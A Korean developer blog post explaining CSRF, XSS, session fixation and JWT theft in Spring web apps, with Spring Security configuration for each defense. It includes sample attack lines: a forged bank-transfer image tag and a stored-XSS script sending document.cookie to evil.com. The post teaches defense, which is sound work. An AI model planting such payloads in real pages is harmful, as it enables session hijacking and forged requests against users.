---
title: "Spring 웹 애플리케이션의 4대 보안 공격: CSRF, XSS, 세션 고정, JWT 탈취"
date: 2026-07-06
last_modified_at: 2026-07-06
categories: [dev, security]
tags: [weekly paper, spring-security, csrf, xss, session, jwt, security]
toc: true
comments: true
---

## Summary

- **CSRF**: 브라우저가 쿠키를 자동 전송하는 특성을 악용해 사용자 권한으로 요청을 위조하는 공격
- **XSS**: 신뢰할 수 없는 스크립트가 브라우저에서 실행되어 쿠키·세션·DOM을 탈취하는 공격
- **세션 고정**: 공격자가 미리 발급받은 세션 ID를 피해자에게 강제로 사용하게 만드는 공격
- **JWT 탈취**: Stateless 토큰의 특성상 탈취되면 만료 전까지 서버가 즉시 무효화하기 어려운 공격
- 네 공격 모두 "인증된 사용자의 신원을 가로채거나 대신 행동한다"는 공통점이 있지만, 공격 지점(전송 계층 / 클라이언트 실행 / 세션 발급 / 토큰 보관)이 서로 다르다.

---

## Background

웹 애플리케이션의 인증·인가는 브라우저-서버 간 신뢰를 전제로 동작한다. 이 신뢰 관계를 깨뜨리는 대표적인 방법이 바로 이 네 가지 공격이다. OWASP Top 10에서도 CSRF·XSS는 오랫동안 상위권에 있었고, 세션 고정과 JWT 탈취는 각각 세션 기반·토큰 기반 인증 구조 자체의 약점에서 비롯된다.

Spring Security는 이 공격들에 대한 기본 방어를 상당 부분 자동으로 제공하지만("Secure by Default"), 설정을 잘못 끄거나 JWT처럼 프레임워크가 직접 관리하지 않는 영역에서는 개발자가 별도로 대응해야 한다.

---

## CSRF (Cross-Site Request Forgery)

### 공격 원리

사용자가 A 사이트에 로그인된 상태에서 악성 사이트 B를 방문하면, B가 A로 향하는 요청(폼 제출, 이미지 태그 등)을 자동 생성한다. 브라우저는 도메인 A의 쿠키를 자동으로 첨부하므로, 서버는 이 요청을 정상 사용자의 요청으로 착각한다.

```html
<!-- 악성 사이트 B에 삽입된 코드 -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000000">
```

### Spring Security 대응

- **CSRF 토큰**: Spring Security는 기본적으로 `CsrfFilter`를 통해 상태 변경 요청(POST/PUT/DELETE)마다 예측 불가능한 토큰을 요구한다. 서버 사이드 렌더링 앱에서는 기본 활성화 상태를 유지하는 것이 권장된다.

```java
http
    .csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    );
```

- **SameSite 쿠키 속성**: `SameSite=Strict` 또는 `Lax`로 설정하면 크로스 사이트 요청에 쿠키 자체가 첨부되지 않아 CSRF 공격 표면이 크게 줄어든다.
- **REST API(Stateless, Bearer 토큰)**: 쿠키 기반 인증을 사용하지 않는다면 CSRF 위험이 구조적으로 낮아 `csrf().disable()`이 일반적이다. 단, 쿠키에 토큰을 저장하는 경우는 예외.

---

## XSS (Cross-Site Scripting)

### 공격 원리

공격자가 삽입한 스크립트가 피해자의 브라우저에서 실행되어 쿠키, localStorage, DOM을 임의로 조작한다.

| 유형 | 설명 |
|---|---|
| Reflected XSS | 요청 파라미터가 응답에 그대로 반영되어 즉시 실행 |
| Stored XSS | 게시글·댓글 등 DB에 저장된 악성 스크립트가 조회 시마다 실행 |
| DOM-based XSS | 서버를 거치지 않고 클라이언트 JS가 DOM을 조작하는 과정에서 발생 |

```html
<!-- Stored XSS 예시: 댓글에 저장된 스크립트 -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

### 대응 전략

- **출력 이스케이핑**: Thymeleaf `th:text`, JSTL `<c:out>` 등 템플릿 엔진의 기본 이스케이핑 기능은 항상 유지한다. `th:utext`처럼 이스케이프를 우회하는 태그는 신뢰할 수 있는 데이터에만 사용한다.
- **CSP(Content-Security-Policy) 헤더**: Spring Security의 `headers()` 설정으로 인라인 스크립트 실행을 차단한다.

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("script-src 'self'"))
);
```

- **입력 검증**: 화이트리스트 기반 검증(허용 문자·태그만 통과) — 블랙리스트 방식은 우회가 쉬워 권장되지 않는다.
- **쿠키 `HttpOnly` 속성**: XSS가 발생해도 JS에서 쿠키를 읽지 못하도록 세션 쿠키 탈취 자체를 차단한다.

---

## 세션 고정 공격 (Session Fixation)

### 공격 원리

1. 공격자가 서버에서 세션 ID를 미리 발급받는다 (`sessionId=attacker123`).
2. 피해자에게 해당 세션 ID를 포함한 링크를 전달한다 (`https://site.com/login?sessionId=attacker123`).
3. 피해자가 그 세션 ID로 로그인에 성공하면, 서버는 로그인 이후에도 동일한 세션 ID를 유지한다.
4. 공격자는 이미 알고 있는 세션 ID로 피해자의 인증된 세션에 접근한다.

핵심은 **로그인 전후로 세션 ID가 바뀌지 않는다**는 취약점이다.

### Spring Security 대응

Spring Security는 기본적으로 로그인 성공 시 세션을 마이그레이션한다(`migrateSession`이 기본값). 별도 설정 없이도 새 세션 ID가 발급되지만, 명시적으로 정책을 지정할 수도 있다.

```java
http.sessionManagement(session -> session
    .sessionFixation(fixation -> fixation.migrateSession()) // 기존 세션 속성 유지 + 새 ID 발급 (기본값)
    // .newSession()   // 완전히 새 세션 생성
    // .changeSessionId() // 서블릿 컨테이너 API로 ID만 교체
);
```

---

## JWT 탈취 (JWT Theft)

### 공격 원리

JWT는 Stateless이므로 서버가 별도 저장소를 조회하지 않고 서명 검증만으로 인증을 처리한다. 이는 확장성 이점이지만, 토큰이 탈취되면(XSS, 네트워크 스니핑, 로그 유출 등) **만료 시각 전까지 서버가 즉시 무효화할 방법이 없다**는 구조적 약점이 된다.

### 대응 전략

- **Access Token 수명 단축**: 5~15분 수준으로 짧게 유지해 탈취되어도 피해 시간을 최소화한다.
- **Refresh Token Rotation**: Refresh Token은 서버(DB)에 저장해 검증하고, 사용될 때마다 새 토큰으로 교체 + 이전 토큰 폐기. 재사용이 감지되면 전체 토큰 체인을 무효화한다.
- **저장 위치**: `HttpOnly` + `Secure` + `SameSite` 쿠키에 저장해 XSS로부터는 보호하고, CSRF 토큰을 병행해 CSRF도 방어한다. localStorage 저장은 XSS에 그대로 노출되므로 지양한다.
- **토큰 바인딩/블랙리스트**: 완전한 Stateless를 포기하더라도, 로그아웃·탈취 의심 시 즉시 차단이 필요한 서비스는 짧은 TTL의 블랙리스트(Redis 등)를 Access Token 검증에 추가한다.

---

## 비교 요약

| 공격 | 공격 지점 | 핵심 방어 |
|---|---|---|
| CSRF | 쿠키 자동 전송 | CSRF 토큰, SameSite 쿠키 |
| XSS | 클라이언트 스크립트 실행 | 출력 이스케이핑, CSP, HttpOnly |
| 세션 고정 | 로그인 전후 세션 ID 미변경 | 로그인 성공 시 세션 ID 재발급 |
| JWT 탈취 | Stateless 토큰의 즉시 무효화 불가 | 짧은 수명 + Refresh Rotation + HttpOnly 저장 |

---

## Key Point

> **네 공격은 모두 "누가 요청을 보냈는가"를 서버가 잘못 신뢰하는 데서 발생한다.** CSRF는 쿠키의 자동 전송을, XSS는 브라우저의 스크립트 실행을, 세션 고정은 세션 발급 시점을, JWT 탈취는 Stateless 구조의 무효화 불가능성을 파고든다. Spring Security의 기본값(CSRF 토큰 활성화, 세션 마이그레이션)을 함부로 끄지 않는 것만으로 상당 부분이 방어되며, JWT처럼 프레임워크가 대신 지켜주지 않는 영역은 수명 단축과 Rotation으로 직접 보완해야 한다.

---

## Reference

- [OWASP Cross-Site Request Forgery (CSRF) Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — CSRF 방어 전략 총정리
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — XSS 유형별 대응
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — 세션 고정 공격 및 대응
- [Spring Security Reference — CSRF](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html) — Spring Security 공식 CSRF 문서
- [Spring Security Reference — Session Management](https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html) — 세션 고정 방어 설정